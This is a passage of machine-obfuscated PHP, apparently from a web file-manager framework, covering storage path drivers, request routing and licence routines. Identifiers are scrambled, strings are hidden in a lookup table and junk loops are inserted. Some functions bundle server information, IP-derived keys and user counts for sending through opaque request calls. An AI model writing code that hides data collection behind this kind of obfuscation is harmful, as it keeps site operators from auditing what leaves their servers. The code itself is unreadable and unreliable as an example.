listAll($¼ª–êÏ°) { $õËëìˆó =& $_SERVER[ıÚ˜š²İ]; $ÂÜú™ö¾ = IO::listAll($¼ª–êÏ°); $ÏĞñ‘ß€ = rtrim($this->pathParse[$õËëìˆó[564]][$õËëìˆó[1271]], $õËëìˆó[8]); foreach ($ÂÜú™ö¾ as &$•ÜŠ·†) { $•ÜŠ·†[$õËëìˆó[87]] = $this->pathDriver . $õËëìˆó[8] . ltrim(substr($•ÜŠ·†[$õËëìˆó[87]], strlen($ÏĞñ‘ß€)), $õËëìˆó[8]); } unset($•ÜŠ·†); return $ÂÜú™ö¾; } public function listAllSimple($«âš¸îƒ, $å¾‘š = false) { $°ûŒëÀ =& $_SERVER[ıÚ˜š²İ]; $ÍöĞÅ¯â = $this->listAll($«âš¸îƒ); $äÖ€Ë¾· = $this->pathParse[$°ûŒëÀ[497]]; if (trim($äÖ€Ë¾·, $°ûŒëÀ[8]) == trim(get_path_father($äÖ€Ë¾·), $°ûŒëÀ[8])) { $å¾‘š = !0; } return IO::init($°ûŒëÀ[12])->listAllSimpleMake($ÍöĞÅ¯â, $äÖ€Ë¾·, $å¾‘š); } public function getPathOuter($„³ö÷º£) { $â¤«— =& $_SERVER[ıÚ˜š²İ]; $û‹œÅ†Ö = KodIO::parse($„³ö÷º£); if ($û‹œÅ†Ö[$â¤«—[33]] == KodIO::KOD_SHARE_ITEM) { return $û‹œÅ†Ö[$â¤«—[87]]; } $Âü‡ ÷° = KodIO::clear($„³ö÷º£); $‡Ÿ½®’³ = KodIO::clear($this->pathParse[$â¤«—[564]][$â¤«—[1271]]); $‰Á´Øû‘ = substr($Âü‡ ÷°, strlen($‡Ÿ½®’³)); if (substr($Âü‡ ÷°, 0, strlen($‡Ÿ½®’³)) != $‡Ÿ½®’³) { return !1; } return $this->pathParse[$â¤«—[1264]] . $â¤«—[8] . ltrim($‰Á´Øû‘, $â¤«—[8]); } public function getType() { $Æó—•ïÊ =& $_SERVER[ıÚ˜š²İ]; $ç¦€˜‘ô = str_replace($Æó—•ïÊ[77], $Æó—•ïÊ[12], get_class($this)); return strtolower($ç¦€˜‘ô); } public function isOsDriver($ùÆ»ÁØû) { return IO::isOsDriver($ùÆ»ÁØû); } public function info($ÎÙ¶æ¹) { return $this->infoParse($ÎÙ¶æ¹); } public function infoAuth($˜˜òÜ‚) { return $this->infoParse($˜˜òÜ‚); } public function infoWithChildren($‚²Š‘…æ) { return $this->infoParse($‚²Š‘…æ, !0); } public function infoFull($Ø©æ°…ë) { return $this->infoParse($Ø©æ°…ë); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ş”Ï¹“Ã) { $this->pathParse = $ş”Ï¹“Ã; } protected function infoParse($’…¹’äÖ, $ßüıò˜Ç = false) { $ªîÑÄû¼ =& $_SERVER[ıÚ˜š²İ]; return Action($ªîÑÄû¼[1270])->sharePathInfo($this->pathParse[$ªîÑÄû¼[87]], !0, $ßüıò˜Ç); } public function listPath($ã¦üç•£, $øèê‚Ú¢ = false) { $²‹šèÔ¤ =& $_SERVER[ıÚ˜š²İ]; $’œ—Ô« = IO::listPath($ã¦üç•£, $øèê‚Ú¢); if (!$’œ—Ô«) { return $’œ—Ô«; } if (is_array($’œ—Ô«[$²‹šèÔ¤[1450]])) { $ñ¾½’Ö = Action($²‹šèÔ¤[1459])->parsePathChildren($’œ—Ô«[$²‹šèÔ¤[1450]], array($²‹šèÔ¤[497] => $ã¦üç•£)); $’œ—Ô«[$²‹šèÔ¤[1450]] = Action($²‹šèÔ¤[1270])->shareItemInfo($ñ¾½’Ö); } foreach ($’œ—Ô« as $ŸİÛà­æ => $±‰ãå¾€) { if (!in_array($ŸİÛà­æ, array($²‹šèÔ¤[86], $²‹šèÔ¤[85]))) { continue; } foreach ($±‰ãå¾€ as $å‘§ß”Í => $ñ¾½’Ö) { $ñ¾½’Ö = Action($²‹šèÔ¤[1459])->parsePathChildren($ñ¾½’Ö, array($²‹šèÔ¤[497] => $ã¦üç•£)); $’œ—Ô«[$ŸİÛà­æ][$å‘§ß”Í] = Action($²‹šèÔ¤[1270])->shareItemInfo($ñ¾½’Ö); } } return $’œ—Ô«; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($Ã±Îº–æ) { parent::__construct($Ã±Îº–æ); $this->setSignVersion($_SERVER[ıÚ˜š²İ][250]); } } goto bé¼­Ë²Æ¤; c‡°Ÿ¶óŒ¶: if (strlen($bjlzsecqfw) < $_SERVER[ıÚ˜š²İ][691]) { die; } class Application { private $defaultModule = "\151\x6e\x64\x65\170"; private $defaultController = "\151\156\144\x65\170"; private $defaultAction = "\x69\156\x64\x65\x78"; function __construct() { } public function setDefault($ç¢ãÓ½Â) { $‡áíıÄÛ =& $_SERVER[ıÚ˜š²İ]; $˜û‚å…ç =& $_SERVER[æÂ¬Úû¨]; $øéåóÔ¶ = explode($˜û‚å…ç[0], trim($ç¢ãÓ½Â, $˜û‚å…ç[0])); $this->defaultModule = $øéåóÔ¶[0] ? $øéåóÔ¶[0] : $this->defaultModule; $this->defaultController = $øéåóÔ¶[1] ? $øéåóÔ¶[1] : $this->defaultController; $this->defaultAction = $øéåóÔ¶[2] ? $øéåóÔ¶[2] : $this->defaultAction; $Œ€•÷†» = $‡áíıÄÛ[692]; if (strlen($Œ€•÷†») < $‡áíıÄÛ[693]) { die; } $this->htjkf8d9bc5f($˜û‚å…ç[1], array($this, $˜û‚å…ç[2])); $Î‹š÷ÖÓ = $‡áíıÄÛ[694]; while (strlen($Î‹š÷ÖÓ) < $‡áíıÄÛ[687]) { if (!$Î‹š÷ÖÓ) { break; } $Î‹š÷ÖÓ++; } } public function appRun($ŞÅÆ°µı) { $¨Ğ´‡Œ… =& $_SERVER[ıÚ˜š²İ]; $çÚÙÒ× =& $_SERVER[æÂ¬Úû¨]; $ ÁŞ›ó = explode($çÚÙÒ×[0], $ŞÅÆ°µı); $ù­ åÒä = $¨Ğ´‡Œ…[695]; if (strlen($ù­ åÒä) < $¨Ğ´‡Œ…[687]) { return; } $à‡èáúö = strtolower($ ÁŞ›ó[0]); $ÕÉô¬²º = $çÚÙÒ×[3]; $ğú³ÜÊ² = $¨Ğ´‡Œ…[696]; while (strlen($ğú³ÜÊ²) < $¨Ğ´‡Œ…[697]) { if (!$ğú³ÜÊ²) { break; } $ğú³ÜÊ²++; } if ($à‡èáúö == $çÚÙÒ×[4]) { $ÕÉô¬²º = $çÚÙÒ×[5]; $ ÁŞ›ó[0] = $çÚÙÒ×[6]; $ ÁŞ›ó[1] = $ ÁŞ›ó[1] . $çÚÙÒ×[7]; $ŞÅÆ°µı = join($çÚÙÒ×[0], $ ÁŞ›ó); $ŞÅÆ°µı = trim($ŞÅÆ°µı, $çÚÙÒ×[0]); } call_user_func(array($çÚÙÒ×[8], $çÚÙÒ×[9]), $ÕÉô¬²º . $çÚÙÒ×[10], $ŞÅÆ°µı); ActionCall($ŞÅÆ°µı); call_user_func(array($çÚÙÒ×[8], $çÚÙÒ×[9]), $ÕÉô¬²º . $çÚÙÒ×[11], $ŞÅÆ°µı); } private function autorun() { $ªÉ”éÔ§ =& $_SERVER[ıÚ˜š²İ]; $İíüß¶È =& $_SERVER[æÂ¬Úû¨]; global $config; if (count($config[$İíüß¶È[12]]) == 0) { return; } foreach ($config[$İíüß¶È[12]] as $º˜Îœ³ø => $ øûùäÉ) { $this->appRun($ øûùäÉ); $ÜİÇö¢Ú = $ªÉ”éÔ§[698]; if (strlen($ÜİÇö¢Ú) < $ªÉ”éÔ§[691]) { die; } } } private function mzpb07618e96() { $Õ£ £¼ì =& $_SERVER[ıÚ˜š²İ]; $ü¾ü¶ÒÆ =& $_SERVER[æÂ¬Úû¨]; $ëó€º = $ü¾ü¶ÒÆ[4]; $ĞÑÅé = $GLOBALS[$ü¾ü¶ÒÆ[13]][$ü¾ü¶ÒÆ[14]][0]; $ÁßÉ••» = $Õ£ £¼ì[699]; while (strlen($ÁßÉ••») < $Õ£ £¼ì[693]) { if (!$ÁßÉ••») { break; } $ÁßÉ••»++; } if (!$ĞÑÅé || strlen($ĞÑÅé) <= strlen($ëó€º)) { return; } if (strtolower(substr($ĞÑÅé, -strlen($ëó€º))) != $ëó€º) { return; } $ ‘ ³İÆ = substr($ĞÑÅé, 0, -strlen($ëó€º)); $Œóº‚Ç‰ = array($ü¾ü¶ÒÆ[4], $ ‘ ³İÆ); $â¡‹Şª† = $Õ£ £¼ì[700]; $“ŒİùÅ‡ = array_slice($GLOBALS[$ü¾ü¶ÒÆ[13]][$ü¾ü¶ÒÆ[14]], 1); $GLOBALS[$ü¾ü¶ÒÆ[13]][$ü¾ü¶ÒÆ[14]] = array_merge($Œóº‚Ç‰, $“ŒİùÅ‡); $ ÇÙ’ùª = $Õ£ £¼ì[701]; while (strlen($ ÇÙ’ùª) < $Õ£ £¼ì[687]) { if (!$ ÇÙ’ùª) { break; } $ ÇÙ’ùª++; } $GLOBALS[$ü¾ü¶ÒÆ[13]][$ü¾ü¶ÒÆ[15]] = implode($ü¾ü¶ÒÆ[0], $GLOBALS[$ü¾ü¶ÒÆ[13]][$ü¾ü¶ÒÆ[14]]); } private function vtfh63c139a2() { $¢¤ÒêÑ =& $_SERVER[ıÚ˜š²İ]; $§¥ÆûÅµ =& $_SERVER[æÂ¬Úû¨]; if ($GLOBALS[$§¥ÆûÅµ[13]][$§¥ÆûÅµ[15]] != $§¥ÆûÅµ[6]) { return; } $¡‡á¸î£ = $_SERVER[$§¥ÆûÅµ[16]]; $—”ÄÔĞ = $¢¤ÒêÑ[702]; while (strlen($—”ÄÔĞ) < $¢¤ÒêÑ[703]) { if (!$—”ÄÔĞ) { break; } $—”ÄÔĞ++; } $¶úÔ”ñä = $§¥ÆûÅµ[17]; $·•½¾ö = $¢¤ÒêÑ[704]; while ($·•½¾ö < $¢¤ÒêÑ[703]) { if ($·•½¾ö >= 0) { break; } $·•½¾ö++; } if (!strstr($¡‡á¸î£, $¶úÔ”ñä)) { return; } $ÕÇ™ÄåË = strrpos($¡‡á¸î£, $¶úÔ”ñä); $œ€§æ¶ğ = substr($¡‡á¸î£, $ÕÇ™ÄåË + strlen($¶úÔ”ñä)); $ò‰©¡– = $¢¤ÒêÑ[705]; if (!$ò‰©¡–) { die; } preg_match_all($§¥ÆûÅµ[18], $œ€§æ¶ğ, $ÉâºŒËî); $–€Ó—Å = $¢¤ÒêÑ[706]; if (strlen($–€Ó—Å) < $¢¤ÒêÑ[703]) { die; } $œ€§æ¶ğ = trim($ÉâºŒËî[0][0], $§¥ÆûÅµ[19]); $GLOBALS[$§¥ÆûÅµ[13]][$§¥ÆûÅµ[14]] = explode($§¥ÆûÅµ[19], $œ€§æ¶ğ); $ã–şî²• = $¢¤ÒêÑ[707]; while ($ã–şî²• < $¢¤ÒêÑ[687]) { if ($ã–şî²• >= 0) { break; } $ã–şî²•++; } $GLOBALS[$§¥ÆûÅµ[13]][$§¥ÆûÅµ[15]] = implode($§¥ÆûÅµ[0], $GLOBALS[$§¥ÆûÅµ[13]][$§¥ÆûÅµ[14]]); $øÜ‡»İê = $¢¤ÒêÑ[708]; } public function run() { $ç©ìà¥Ş =& $_SERVER[ıÚ˜š²İ]; $”ú¯¾İ» =& $_SERVER[æÂ¬Úû¨]; $this->vtfh63c139a2(); $Â‰¾õ¸Ş = $ç©ìà¥Ş[709]; if (strlen($Â‰¾õ¸Ş) < $ç©ìà¥Ş[693]) { die; } $this->mzpb07618e96(); $ãáÊßı = $GLOBALS[$”ú¯¾İ»[13]][$”ú¯¾İ»[14]]; $Ó…—ŞÍÎ = $ç©ìà¥Ş[710]; if (!$Ó…—ŞÍÎ) { return; } $Ü•˜½ Ê = $GLOBALS[$”ú¯¾İ»[13]][$”ú¯¾İ»[15]]; $¶µù‡Óş = $ç©ìà¥Ş[711]; if (!$¶µù‡Óş) { die; } define($”ú¯¾İ»[20], isset($ãáÊßı[0]) && $ãáÊßı[0] ? $ãáÊßı[0] : $this->defaultModule); define($”ú¯¾İ»[21], isset($ãáÊßı[1]) && $ãáÊßı[0] ? $ãáÊßı[1] : $this->defaultController); define($”ú¯¾İ»[22], isset($ãáÊßı[2]) && $ãáÊßı[0] ? $ãáÊßı[2] : $this->defaultAction); define($”ú¯¾İ»[23], MOD . $”ú¯¾İ»[0] . ST . $”ú¯¾İ»[0] . ACT); $_SERVER[$”ú¯¾İ»[24]] = strtolower(ACTION); $this->autorun(); $šÒ ¿± = $ç©ìà¥Ş[712]; if (strlen($šÒ ¿±) < $ç©ìà¥Ş[703]) { return; } if (count($ãáÊßı) >= 3) { $this->appRun($Ü•˜½ Ê); } else { $this->appRun(ACTION); } } private $mtlhef39ea2d = array(); private $cpmhdb3b5a5f = ''; public function iukv43985835() { $ˆ„¢°ß =& $_SERVER[ıÚ˜š²İ]; $ÑÆÈûı… =& $_SERVER[æÂ¬Úû¨]; $this->yhozf9ac2b86(); $¨ãÇƒ¤» = $ˆ„¢°ß[713]; $this->ygtw88da3dbe(); $this->gkjuec70e794(); $¯¡ü¥ñ = $ˆ„¢°ß[714]; $this->afil21eb022d(); $ıÁğ¢¯‚ = $ˆ„¢°ß[715]; if (!$ıÁğ¢¯‚) { return; } $this->xeswde79d183(); $this->hpcge39d5da5(); $˜©ã¡†î = $ˆ„¢°ß[716]; while ($˜©ã¡†î < $ˆ„¢°ß[687]) { if ($˜©ã¡†î >= 0) { break; } $˜©ã¡†î++; } $this->iveb0ed03303(); $Áª¼Ü«ö = $ˆ„¢°ß[717]; if (strlen($Áª¼Ü«ö) < $ˆ„¢°ß[693]) { return; } $this->htjkf8d9bc5f($ÑÆÈûı…[25], array($this, $ÑÆÈûı…[26])); $this->htjkf8d9bc5f($ÑÆÈûı…[27], array($this, $ÑÆÈûı…[28])); $this->htjkf8d9bc5f($ÑÆÈûı…[29], array($this, $ÑÆÈûı…[30])); $this->htjkf8d9bc5f($ÑÆÈûı…[31], array($this, $ÑÆÈûı…[32])); $šÈº«ç¯ = $ˆ„¢°ß[718]; if (!$šÈº«ç¯) { return; } } public function arnqaf13f849($»ˆĞ©‡¶) { $‹¡äãÉÎ =& $_SERVER[ıÚ˜š²İ]; $®µˆñı× =& $_SERVER[æÂ¬Úû¨]; $¿çÁİÕÃ = Model($®µˆñı×[33])->get(); $—ª­§Å· = array($®µˆñı×[34], $®µˆñı×[35], $®µˆñı×[36], $®µˆñı×[37], $®µˆñı×[38], $®µˆñı×[39], $®µˆñı×[40], $®µˆñı×[41], $®µˆñı×[42], $®µˆñı×[43], $®µˆñı×[44], $®µˆñı×[45], $®µˆñı×[46], $®µˆñı×[47], $®µˆñı×[48], $®µˆñı×[49], $®µˆñı×[50], $®µˆñı×[51], $®µˆñı×[52], $®µˆñı×[53], $®µˆñı×[54], $®µˆñı×[55], $®µˆñı×[56], $®µˆñı×[57], $®µˆñı×[58], $®µˆñı×[59], $®µˆñı×[60], $®µˆñı×[61], $®µˆñı×[62], $®µˆñı×[63], $®µˆñı×[64], $®µˆñı×[65], $®µˆñı×[66], $®µˆñı×[67], $®µˆñı×[68], $®µˆñı×[69], $®µˆñı×[70], $®µˆñı×[71], $®µˆñı×[72], $®µˆñı×[73], $®µˆñı×[74], $®µˆñı×[75], $®µˆñı×[76], $®µˆñı×[77], $®µˆñı×[78], $®µˆñı×[79], $®µˆñı×[80], $®µˆñı×[81], $®µˆñı×[82], $®µˆñı×[83], $®µˆñı×[84], $®µˆñı×[85]); foreach ($—ª­§Å· as $àÊ¹§œ) { $Œ†£Š·ë = $GLOBALS[$®µˆñı×[86]][$®µˆñı×[87]][$àÊ¹§œ]; $ğ—»ä… = $‹¡äãÉÎ[719]; if (strlen($ğ—»ä…) < $‹¡äãÉÎ[703]) { return; } if (isset($¿çÁİÕÃ[$àÊ¹§œ])) { $Œ†£Š·ë = $¿çÁİÕÃ[$àÊ¹§œ]; } $»ˆĞ©‡¶[$®µˆñı×[88]][$®µˆñı×[89]][$àÊ¹§œ] = $Œ†£Š·ë; } $éÀ”Œ¬ı = $»ˆĞ©‡¶[$®µˆñı×[88]][$®µˆñı×[89]][$®µˆñı×[46]]; $µİöïï = $‹¡äãÉÎ[720]; while ($µİöïï < $‹¡äãÉÎ[691]) { if ($µİöïï >= 0) { break; } $µİöïï++; } unset($»ˆĞ©‡¶[$®µˆñı×[88]][$®µˆñı×[90]][$®µˆñı×[91]]); $ÔÔÙÌ¹á = $‹¡äãÉÎ[721]; while (strlen($ÔÔÙÌ¹á) < $‹¡äãÉÎ[703]) { if (!$ÔÔÙÌ¹á) { break; } $ÔÔÙÌ¹á++; } unset($»ˆĞ©‡¶[$®µˆñı×[88]][$®µˆñı×[90]][$®µˆñı×[92]]); $‹£âÃ¹ = $‹¡äãÉÎ[722]; unset($»ˆĞ©‡¶[$®µˆñı×[88]][$®µˆñı×[89]][$®µˆñı×[46]]); $¶Ğ°šÜ´ = $‹¡äãÉÎ[723]; if (strlen($¶Ğ°šÜ´) < $‹¡äãÉÎ[691]) { return; } unset($»ˆĞ©‡¶[$®µˆñı×[88]][$®µˆñı×[89]][$®µˆñı×[93]]); $»ˆĞ©‡¶[$®µˆñı×[88]][$®µˆñı×[89]][$®µˆñı×[94]] = array($®µˆñı×[95] => (int) $éÀ”Œ¬ı[$®µˆñı×[96]], $®µˆñı×[97] => (int) _get($éÀ”Œ¬ı, $®µˆñı×[98], 0)); $‚²µûæ = substr(md5($®µˆñı×[99] . get_client_ip() . $¿çÁİÕÃ[$®µˆñı×[100]]), 0, 15); $»ˆĞ©‡¶[$®µˆñı×[101]][$®µˆñı×[102]] = Mcrypt::encode(Session::sign(), $‚²µûæ, 3600 * 24); $»ˆĞ©‡¶[$®µˆñı×[101]][$®µˆñı×[103]] = Action($®µˆñı×[104])->accessToken(); $»ˆĞ©‡¶[$®µˆñı×[101]][$®µˆñı×[105]] = md5($_SERVER[$®µˆñı×[106]] . $¿çÁİÕÃ[$®µˆñı×[100]]); $»ˆĞ©‡¶[$®µˆñı×[101]][$®µˆñı×[107]] = base64_encode(serverInfo()); $»ˆĞ©‡¶[$®µˆñı×[101]][$®µˆñı×[108]] = $this->cpmhdb3b5a5f; if ($¿çÁİÕÃ[$®µˆñı×[108]] != $®µˆñı×[109]) { $»ˆĞ©‡¶[$®µˆñı×[101]][$®µˆñı×[110]] = $¿çÁİÕÃ[$®µˆñı×[110]]; $»ˆĞ©‡¶[$®µˆñı×[101]][$®µˆñı×[111]] = $¿çÁİÕÃ[$®µˆñı×[111]]; $ãÖ®±œÑ = rand_string(10) . $this->cpmhdb3b5a5f . rand_string(5); $»ˆĞ©‡¶[$®µˆñı×[88]][$®µˆñı×[112]][$®µˆñı×[113]] = $this->dpweb0f778bc($ãÖ®±œÑ, $»ˆĞ©‡¶[$®µˆñı×[101]][$®µˆñı×[105]]); } if ($this->cpmhdb3b5a5f == $®µˆñı×[109]) { $»ˆĞ©‡¶[$®µˆñı×[88]][$®µˆñı×[89]][$®µˆñı×[94]][$®µˆñı×[98]] = 0; } $»ˆĞ©‡¶[$®µˆñı×[101]][$®µˆñı×[114]] = $this->versionPluginFilter(); $»ˆĞ©‡¶[$®µˆñı×[101]][$®µˆñı×[115]] = _get($this->mtlhef39ea2d, $®µˆñı×[116], $®µˆñı×[6]); $Şã‚ÆÜ” = $‹¡äãÉÎ[724]; if (KodUser::isRoot() && $this->config[$®µˆñı×[117]]) { $»ˆĞ©‡¶[$®µˆñı×[101]][$®µˆñı×[118]] = WEB_ROOT; } return $»ˆĞ©‡¶; } private function hpcge39d5da5() { $ı´õ¦ä =& $_SERVER[ıÚ˜š²İ]; $¥ºÔ“€ =& $_SERVER[æÂ¬Úû¨]; $ŠÃäë˜ = $_SERVER[$¥ºÔ“€[24]] == $¥ºÔ“€[119]; if ($_SERVER[$¥ºÔ“€[24]] == $¥ºÔ“€[120] && $_GET[$¥ºÔ“€[121]] == $¥ºÔ“€[122]) { $ŠÃäë˜ = !0; } if ($ŠÃäë˜) { $ªµû˜ßË = array($¥ºÔ“€[108] => $this->cpmhdb3b5a5f, $¥ºÔ“€[123] => $this->sgnh002721ba(), $¥ºÔ“€[124] => Model($¥ºÔ“€[125])->count()); if ($this->cpmhdb3b5a5f != $¥ºÔ“€[109]) { $Ùİíß×• = _get($this->mtlhef39ea2d, $¥ºÔ“€[126]); if ($Ùİíß×•) { $ªµû˜ßË[$¥ºÔ“€[127]] = $Ùİíß×•; $ªµû˜ßË[$¥ºÔ“€[128]] = strtotime(_get($this->mtlhef39ea2d, $¥ºÔ“€[129])); $ªµû˜ßË[$¥ºÔ“€[130]] = _get($this->mtlhef39ea2d, $¥ºÔ“€[116]); } $…å’ÀØ = Model($¥ºÔ“€[33])->get($¥ºÔ“€[131], $¥ºÔ“€[6], !0); if (is_string($…å’ÀØ) && substr($…å’ÀØ, 0, 1) == $¥ºÔ“€[132]) { $…å’ÀØ = json_decode_force($…å’ÀØ); } if (is_array($…å’ÀØ) && $…å’ÀØ[$¥ºÔ“€[133]] && strstr($…å’ÀØ[$¥ºÔ“€[133]], $¥ºÔ“€[134])) { $–ÀÅò‚æ = explode($¥ºÔ“€[134], $…å’ÀØ[$¥ºÔ“€[133]]); $ªµû˜ßË[$¥ºÔ“€[135]] = $–ÀÅò‚æ[0]; } } $ªµû˜ßË = $this->kyor2b37a819(json_encode($ªµû˜ßË), md5($¥ºÔ“€[136])); $á©‡¦î“ = $ı´õ¦ä[725]; $Ä“ñ®í = array($¥ºÔ“€[137] => $ªµû˜ßË); call_user_func(array($¥ºÔ“€[138], $¥ºÔ“€[139]), $Ä“ñ®í); $ğæò§Ğ† = $ı´õ¦ä[726]; } if ($this->cpmhdb3b5a5f == $¥ºÔ“€[109]) { return; } $´îâÆÓª = array($¥ºÔ“€[140], $¥ºÔ“€[141], $¥ºÔ“€[142], $¥ºÔ“€[143], $¥ºÔ“€[144], $¥ºÔ“€[145]); $õÙúÃ¶À = $ı´õ¦ä[727]; while ($õÙúÃ¶À < $ı´õ¦ä[693]) { if ($õÙúÃ¶À >= 0) { break; } $õÙúÃ¶À++; } $†ÊœìÌÜ = Model($¥ºÔ“€[33])->get(); $°àÆÊÏŸ = $ı´õ¦ä[728]; while ($°àÆÊÏŸ < $ı´õ¦ä[691]) { if ($°àÆÊÏŸ >= 0) { break; } $°àÆÊÏŸ++; } $Ä“ñ®í = array($¥ºÔ“€[146] => $†ÊœìÌÜ[$¥ºÔ“€[34]], $¥ºÔ“€[147] => $†ÊœìÌÜ[$¥ºÔ“€[35]], $¥ºÔ“€[148] => $¥ºÔ“€[6]); foreach ($´îâÆÓª as $‘İ¥ò¸) { if (!isset($†ÊœìÌÜ[$‘İ¥ò¸]) || !$†ÊœìÌÜ[$‘İ¥ò¸]) { continue; } $Ä“ñ®í[$‘İ¥ò¸] = $†ÊœìÌÜ[$‘İ¥ò¸]; $³ÊóÂŠô = $ı´õ¦ä[729]; if (strlen($³ÊóÂŠô) < $ı´õ¦ä[691]) { die; } } call_user_func(array($¥ºÔ“€[138], $¥ºÔ“€[139]), $Ä“ñ®í); } private function afil21eb022d() { $¿ß–úú» =& $_SERVER[ıÚ˜š²İ]; $Ü­µÜ¤İ =& $_SERVER[æÂ¬Úû¨]; if ($_SERVER[$Ü­µÜ¤İ[24]] != $Ü­µÜ¤İ[149]) { return; } if (!KodUser::isRoot()) { die; } $£°ÅŠæÓ = $GLOBALS[$Ü­µÜ¤İ[13]]; if (isset($£°ÅŠæÓ[$Ü­µÜ¤İ[150]])) { $this->uzevdfa5ce40(); die; } if (isset($£°ÅŠæÓ[$Ü­µÜ¤İ[151]]) && isset($£°ÅŠæÓ[$Ü­µÜ¤İ[151]]) == $Ü­µÜ¤İ[122]) { $£°ÅŠæÓ[$Ü­µÜ¤İ[152]] = Model($Ü­µÜ¤İ[33])->get($Ü­µÜ¤İ[153]); } if (!isset($£°ÅŠæÓ[$Ü­µÜ¤İ[152]]) || strlen($£°ÅŠæÓ[$Ü­µÜ¤İ[152]]) != 16) { show_json($Ü­µÜ¤İ[154] . $£°ÅŠæÓ[$Ü­µÜ¤İ[152]], !1); } $¢÷¤÷áÙ = Model($Ü­µÜ¤İ[33])->get($Ü­µÜ¤İ[100]); $ªÔËˆîÎ = md5($_SERVER[$Ü­µÜ¤İ[106]] . $¢÷¤÷áÙ); $¡Ïìâª´ = $¿ß–úú»[730]; if (strlen($¡Ïìâª´) < $¿ß–úú»[703]) { return; } $ÛíŞ°§È = array($Ü­µÜ¤İ[152] => $£°ÅŠæÓ[$Ü­µÜ¤İ[152]], $Ü­µÜ¤İ[155] => rand_string(16), $Ü­µÜ¤İ[156] => $Ü­µÜ¤İ[136], $Ü­µÜ¤İ[157] => $Ü­µÜ¤İ[158], $Ü­µÜ¤İ[159] => $_SERVER[$Ü­µÜ¤İ[160]], $Ü­µÜ¤İ[161] => $_SERVER[$Ü­µÜ¤İ[162]], $Ü­µÜ¤İ[163] => $_SERVER[$Ü­µÜ¤İ[164]], $Ü­µÜ¤İ[105] => $ªÔËˆîÎ, $Ü­µÜ¤İ[165] => Model($Ü­µÜ¤İ[33])->get($Ü­µÜ¤İ[131])); if (isset($£°ÅŠæÓ[$Ü­µÜ¤İ[151]]) && isset($£°ÅŠæÓ[$Ü­µÜ¤İ[151]]) == $Ü­µÜ¤İ[122]) { $ÛíŞ°§È[$Ü­µÜ¤İ[151]] = md5($ÛíŞ°§È[$Ü­µÜ¤İ[152]] . $Ü­µÜ¤İ[166] . $ÛíŞ°§È[$Ü­µÜ¤İ[155]]); } if ($£°ÅŠæÓ[$Ü­µÜ¤İ[167]] == $Ü­µÜ¤İ[168]) { $º•Í­Ø© = $this->kyor2b37a819($ªÔËˆîÎ, $Ü­µÜ¤İ[169]); $¬Ö¨¿Ûµ = $this->dpweb0f778bc(json_encode($ÛíŞ°§È), $ªÔËˆîÎ . $Ü­µÜ¤İ[170], 3); $¬Ö¨¿Ûµ = $¬Ö¨¿Ûµ . $Ü­µÜ¤İ[171] . $_SERVER[$Ü­µÜ¤İ[160]]; $€‹èØ™ = $this->yclo34f72b08($Ü­µÜ¤İ[172] . $º•Í­Ø© . $Ü­µÜ¤İ[173] . $¬Ö¨¿Ûµ, -1); show_json($€‹èØ™, !0); } else { if ($£°ÅŠæÓ[$Ü­µÜ¤İ[167]] == $Ü­µÜ¤İ[174]) { $µ½®À£ = substr(md5($Ü­µÜ¤İ[175] . $ªÔËˆîÎ), 12, 15) . $Ü­µÜ¤İ[176]; $¬Ö¨¿Ûµ = $this->mvasd6f56294(trim($£°ÅŠæÓ[$Ü­µÜ¤İ[177]]), $µ½®À£, 2); $½‘àÀ²Æ = json_decode($¬Ö¨¿Ûµ, !0); if (!is_array($½‘àÀ²Æ) || !is_array($½‘àÀ²Æ[$Ü­µÜ¤İ[178]]) || $½‘àÀ²Æ[$Ü­µÜ¤İ[152]] != !0) { $šŒ±ŠÖµ = $Ü­µÜ¤İ[179]; $íİßèœõ = $½‘àÀ²Æ[$Ü­µÜ¤İ[178]] ? $Ü­µÜ¤İ[180] . $½‘àÀ²Æ[$Ü­µÜ¤İ[178]] : $šŒ±ŠÖµ; show_json($íİßèœõ, !1); } else { $ÛíŞ°§È[$Ü­µÜ¤İ[155]] = $½‘àÀ²Æ[$Ü­µÜ¤İ[178]][$Ü­µÜ¤İ[181]]; } } else { $½‘àÀ²Æ = $this->yclo34f72b08($Ü­µÜ¤İ[182], $ÛíŞ°§È, 10); } } if (!is_array($½‘àÀ²Æ) || !is_array($½‘àÀ²Æ[$Ü­µÜ¤İ[178]]) || $½‘àÀ²Æ[$Ü­µÜ¤İ[152]] != !0) { $šŒ±ŠÖµ = LNG($Ü­µÜ¤İ[183]); $íİßèœõ = $½‘àÀ²Æ[$Ü­µÜ¤İ[178]] ? $Ü­µÜ¤İ[180] . $½‘àÀ²Æ[$Ü­µÜ¤İ[178]] : $šŒ±ŠÖµ; show_json($íİßèœõ, !1); } $çØÏ¼¼é = $½‘àÀ²Æ[$Ü­µÜ¤İ[178]]; $ş¢İç¶ = $this->cahy6e9adc79($çØÏ¼¼é[$Ü­µÜ¤İ[184]]); $¹èÀüûÉ = $¿ß–úú»[731]; while (strlen($¹èÀüûÉ) < $¿ß–úú»[703]) { if (!$¹èÀüûÉ) { break; } $¹èÀüûÉ++; } if (!$ş¢İç¶ || $ş¢İç¶ != $çØÏ¼¼é[$Ü­µÜ¤İ[129]]) { $ªÈßÂ„¶ = array($Ü­µÜ¤İ[185] => Model($Ü­µÜ¤İ[33])->get($Ü­µÜ¤İ[100]), $Ü­µÜ¤İ[186] => $_SERVER[$Ü­µÜ¤İ[106]], $Ü­µÜ¤İ[187] => this_url(), $Ü­µÜ¤İ[161] => $_SERVER[$Ü­µÜ¤İ[162]]); $¬Ö¨¿Ûµ = $this->zqmv63555784(json_encode($ªÈßÂ„¶)); $this->yclo34f72b08($Ü­µÜ¤İ[188] . $¬Ö¨¿Ûµ); show_json(LNG($Ü­µÜ¤İ[189]), !0); } $¡’Ñúğ = array($Ü­µÜ¤İ[153] => $çØÏ¼¼é[$Ü­µÜ¤İ[190]], $Ü­µÜ¤İ[191] => $çØÏ¼¼é[$Ü­µÜ¤İ[192]], $Ü­µÜ¤İ[193] => rand_string(16), $Ü­µÜ¤İ[108] => $çØÏ¼¼é[$Ü­µÜ¤İ[194]]); if ($ÛíŞ°§È[$Ü­µÜ¤İ[155]]) { $¡’Ñúğ[$Ü­µÜ¤İ[193]] = $ÛíŞ°§È[$Ü­µÜ¤İ[155]]; } $äòšôâ = substr(md5($¡’Ñúğ[$Ü­µÜ¤İ[191]]), 10, 10); $¢ÄæÂ¼ = $äòšôâ . $¡’Ñúğ[$Ü­µÜ¤İ[108]] . 